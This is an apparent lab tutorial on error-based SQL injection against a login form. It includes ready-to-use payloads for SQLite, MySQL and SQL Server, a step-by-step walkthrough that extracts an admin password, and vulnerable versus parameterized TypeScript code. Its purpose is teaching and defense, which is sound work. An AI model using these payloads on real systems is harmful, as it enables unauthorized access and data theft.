# 💥 Error-Based SQL Injection Explained

A comprehensive guide to understanding error-based SQL injection attacks.

---

## 🎯 What is Error-Based SQL Injection?

Error-based SQL injection is a technique where attackers **intentionally trigger SQL errors** to extract information about the database structure, data, and application logic.

### The Key Concept:
When a database encounters an error, it often returns detailed error messages. If these messages are shown to users (like in LOW security), attackers can use them to:
- Learn database structure
- Extract sensitive data
- Understand the SQL query format
- Craft more precise attacks

---

## 🔍 How It Works

### Step 1: Trigger a Basic Error

**Input:**
```
Email: admin@example.com'
Password: test
```

**What Happens:**
The single quote `'` breaks the SQL syntax, causing an error.

**SQL Query Becomes:**
```sql
SELECT * FROM users 
WHERE email = 'admin@example.com'' AND password = 'test'
```

**Error Message (Example):**
```
SQLITE_ERROR: near "' AND password": syntax error
```

**What You Learn:**
- ✅ The application uses SQL
- ✅ Your input is directly inserted into the query
- ✅ The query structure includes email and password
- ✅ The injection point exists!

---

### Step 2: Extract Information via Errors

Once you know injection is possible, you can extract data through error messages.

#### Example 1: Database Version
```
Email: ' AND 1=CAST(sqlite_version() AS INT) --
Password: x
```

**What Happens:**
- Tries to convert SQLite version (text) to integer
- Causes type conversion error
- Error message reveals: `"cannot convert '3.40.1' to integer"`
- **You just learned the database version!**

---

#### Example 2: Extract Table Names
```
Email: ' AND 1=CAST((SELECT name FROM sqlite_master LIMIT 1) AS INT) --
Password: x
```

**What Happens:**
- Queries system table for table names
- Forces type conversion error
- Error reveals: `"cannot convert 'users' to integer"`
- **You just discovered the 'users' table exists!**

---

#### Example 3: Extract Column Names
```
Email: ' AND 1=CAST((SELECT sql FROM sqlite_master WHERE name='users') AS INT) --
Password: x
```

**What Happens:**
- Queries table structure
- Error reveals: `"cannot convert 'CREATE TABLE users (id, email, password, role)' to integer"`
- **You just learned all column names!**

---

#### Example 4: Extract Actual Data
```
Email: ' AND 1=CAST((SELECT email FROM users LIMIT 1) AS INT) --
Password: x
```

**What Happens:**
- Queries user email
- Error reveals: `"cannot convert 'admin@example.com' to integer"`
- **You just extracted real user data!**

---

## 🎓 Real Example Walkthrough

Let's walk through a complete attack on LOW security:

### Attack 1: Confirm Injection Point
```
Input: admin@example.com'
Result: SQL Error ✅
Conclusion: Injection possible!
```

### Attack 2: Test Query Structure
```
Input: admin@example.com' AND '1'='1
Result: Login works ✅
Conclusion: Can add conditions!
```

### Attack 3: Extract Database Info
```
Input: ' AND 1=CAST(sqlite_version() AS INT) --
Result: Error shows "3.40.1" ✅
Conclusion: SQLite version 3.40.1
```

### Attack 4: Find Tables
```
Input: ' AND 1=CAST((SELECT name FROM sqlite_master) AS INT) --
Result: Error shows "users" ✅
Conclusion: 'users' table exists
```

### Attack 5: Get Column Names
```
Input: ' AND 1=CAST((SELECT sql FROM sqlite_master WHERE name='users') AS INT) --
Result: Error shows full CREATE TABLE statement ✅
Conclusion: Columns are id, email, password, role
```

### Attack 6: Extract Data
```
Input: ' AND 1=CAST((SELECT password FROM users WHERE email='admin@example.com') AS INT) --
Result: Error shows "admin123" ✅
Conclusion: Admin password extracted!
```

---

## 🛡️ Why This Works (and Why It's Dangerous)

### In LOW Security:
```typescript
// ❌ Vulnerable code
const query = `SELECT * FROM users WHERE email = '${email}'`;
try {
  const user = db.prepare(query).get();
} catch (error) {
  // Shows error to user - DANGEROUS!
  return { error: error.message };
}
```

**Problems:**
1. Direct string concatenation
2. SQL errors shown to users
3. No input validation
4. Detailed error messages

---

### In MEDIUM Security:
```typescript
// 🟡 Better but still vulnerable
const query = `SELECT * FROM users WHERE email = '${email}'`;
try {
  const user = db.prepare(query).get();
} catch (error) {
  // Hides error details
  console.error(error); // Only logs server-side
  return { message: "Login failed" };
}
```

**Improvements:**
- ✅ Errors hidden from users
- ❌ Still uses string concatenation
- ❌ Still vulnerable to blind SQL injection

---

### In VERY HIGH Security:
```typescript
// ✅ Properly secured
const query = `SELECT * FROM users WHERE email = ?`;
try {
  const user = db.prepare(query).get(email);
} catch (error) {
  console.error(error);
  return { message: "Login failed" };
}
```

**Why It's Secure:**
- ✅ Parameterized queries
- ✅ Input treated as data, not code
- ✅ Errors hidden from users
- ✅ No injection possible

---

## 🔬 Different Types of Error-Based Injection

### 1. Syntax Errors
**Purpose:** Confirm injection point
```sql
' -- Breaks syntax
'' -- Tests quote escaping
) -- Tests parentheses
```

### 2. Type Conversion Errors
**Purpose:** Extract data through error messages
```sql
' AND 1=CAST(@@version AS INT) -- (SQL Server)
' AND 1=CAST(database() AS INT) -- (MySQL)
' AND 1=CAST(sqlite_version() AS INT) -- (SQLite)
```

### 3. Constraint Violation Errors
**Purpose:** Test database behavior
```sql
' AND 1=(SELECT COUNT(*) FROM users) -- 
' AND 1=(SELECT 1 UNION SELECT 2) --
```

### 4. Function Errors
**Purpose:** Trigger specific error conditions
```sql
' AND 1=CONVERT(INT, (SELECT TOP 1 name FROM sysobjects)) --
' AND extractvalue(1, concat(0x7e, version())) --
```

---

## 📊 Information You Can Extract

| Information | Example Query | What You Learn |
|-------------|---------------|----------------|
| Database Type | `' AND 1=version() --` | MySQL, PostgreSQL, etc. |
| Database Version | `' AND 1=sqlite_version() --` | Exact version number |
| Table Names | `' AND 1=(SELECT name FROM sqlite_master) --` | All table names |
| Column Names | `' AND 1=(SELECT sql FROM sqlite_master) --` | Table structure |
| User Data | `' AND 1=(SELECT email FROM users) --` | Actual data |
| Row Count | `' AND 1=(SELECT COUNT(*) FROM users) --` | Number of records |

---

## 🎯 Defense Strategies

### ❌ Insufficient Defenses:
1. **Hiding errors only** - Doesn't prevent blind injection
2. **Keyword filtering** - Can be bypassed
3. **Input validation** - Not comprehensive enough

### ✅ Proper Defenses:
1. **Parameterized Queries** - The ONLY real solution
2. **Hide error details** - Don't leak information
3. **Input validation** - Additional layer
4. **Least privilege** - Limit database permissions
5. **WAF (Web Application Firewall)** - Detect patterns

---

## 🧪 Try It Yourself

In the lab, try these on LOW security:

1. **Basic Error:**
   ```
   Email: admin@example.com'
   ```
   See the syntax error!

2. **Extract Version:**
   ```
   Email: ' AND 1=CAST(sqlite_version() AS INT) --
   ```
   Error shows SQLite version!

3. **Find Tables:**
   ```
   Email: ' AND 1=CAST((SELECT name FROM sqlite_master LIMIT 1) AS INT) --
   ```
   Error reveals table name!

4. **Get Structure:**
   ```
   Email: ' AND 1=CAST((SELECT sql FROM sqlite_master WHERE name='users') AS INT) --
   ```
   Error shows full table structure!

---

## 💡 Key Takeaways

1. **Error messages are dangerous** - They leak critical information
2. **Never show SQL errors to users** - Always use generic messages
3. **Error-based injection is powerful** - Can extract entire databases
4. **Hiding errors isn't enough** - Must use parameterized queries
5. **Defense in depth** - Multiple security layers

---

## 🎓 Learning Path

1. ✅ Understand what error-based injection is
2. ✅ Try basic syntax errors (LOW security)
3. ✅ Extract database information via errors
4. ✅ See how MEDIUM hides errors (but still vulnerable)
5. ✅ Understand why VERY HIGH is secure

---

## ⚠️ Ethical Reminder

This knowledge is for:
- ✅ Building secure applications
- ✅ Understanding vulnerabilities
- ✅ Protecting your own systems
- ✅ Ethical security testing

Never use for:
- ❌ Attacking systems without permission
- ❌ Stealing data
- ❌ Unauthorized access

---

**Master error-based injection to become a better security-aware developer!** 🚀🔐
